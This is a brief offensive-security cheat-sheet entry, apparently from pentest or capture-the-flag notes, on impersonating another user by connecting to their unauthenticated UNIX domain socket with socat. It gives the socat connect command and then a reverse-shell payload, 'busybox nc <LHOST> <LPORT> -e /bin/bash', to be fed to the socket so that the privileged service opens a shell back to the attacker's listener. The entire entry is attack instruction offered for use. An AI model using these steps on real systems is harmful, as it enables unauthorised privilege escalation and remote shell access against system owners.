# UNIX Socket Impersonation (socat)

A UNIX domain socket owned by another user, found via `.bash_history`, `pspy`, or `lsof`, often exposes a privileged service with no auth of its own — connecting to it runs you as whatever process is listening:

```bash
socat stdio unix-connect:/path/to/other-users.sock
```
If the service only takes commands (no shell), send one that spawns a reverse shell instead: `busybox nc <LHOST> <LPORT> -e /bin/bash` as the socket's input, caught by a listener on your side.
